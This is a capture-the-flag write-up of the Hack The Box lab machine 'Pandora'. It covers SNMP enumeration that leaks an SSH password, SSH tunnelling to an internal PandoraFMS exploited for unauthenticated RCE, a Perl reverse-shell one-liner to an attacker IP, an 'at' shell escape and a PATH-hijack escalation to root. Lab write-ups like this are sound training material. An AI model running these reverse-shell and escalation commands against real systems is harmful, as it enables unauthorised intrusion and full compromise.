---
title: "HTB - Pandora"
date: 2025-07-26
author: "ChaosSec"
tags: ["HTB", "SNMP", "PandoraFMS", "Linux", "Privilege Escalation"]
summary: ""
---

## 🔍 Port Scanning

```bash
# TCP Scan
PORT     STATE SERVICE
22/tcp   open  ssh       OpenSSH 8.2p1
80/tcp   open  http      Apache httpd 2.4.41

# UDP Scan
161/udp  open  snmp
```

## 🌐 Web Enumeration

The HTTP site on port 80 contains only a contact form. Using `wfuzz`, we discover a directory with listing enabled:

```bash
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc=404 http://pandora.htb/FUZZ
```

The response shows a folder named `assets`.

Also, the main page references `PLAY` as a subdomain of `panda.htb`.  
After adding the hostname to `/etc/hosts`, virtual hosting worked as expected.

## 📡 SNMP Enumeration

Using `snmp-check`, we found several processes — one of which included credentials for user `daniel`.

```bash
ssh daniel@<target-ip>
# Password: HotelBabylon23
```

Logged in successfully.

## 🛠 Internal Web & PandoraFMS Exploitation

While browsing locally, we noticed that PandoraFMS is running on the internal port 80.

Used SSH port forwarding:

```bash
ssh -L 8082:127.0.0.1:80 -N daniel@<target-ip>
```

Accessed via `http://localhost:8082`.

The PandoraFMS version was vulnerable to unauthenticated RCE:  
🔗 https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated

## 🐚 Reverse Shell

Used the exploit to get a reverse shell:

```bash
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.246:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

Upgraded shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Obtained user flag for **matt**.

## ⬆️ Privilege Escalation

### 1. SUID Enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
```

We found several interesting binaries, including `at`.

### 2. Exploiting `at` (Scheduled Job)

```bash
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now
tail -f /dev/null
```

Unfortunately, we didn't have Matt's `sudo` password, so we couldn’t escalate using `sudo`.

### 3. Exploiting `pandora_backup`

This binary executes `tar` without using an absolute path — making it vulnerable to `$PATH` injection.

#### Exploit:

```bash
cd /tmp
echo "/bin/sh" > tar
chmod +x tar
export PATH=/tmp:$PATH
pandora_backup
```

This gives us a shell as **root**.

🎯 **Root access achieved.**
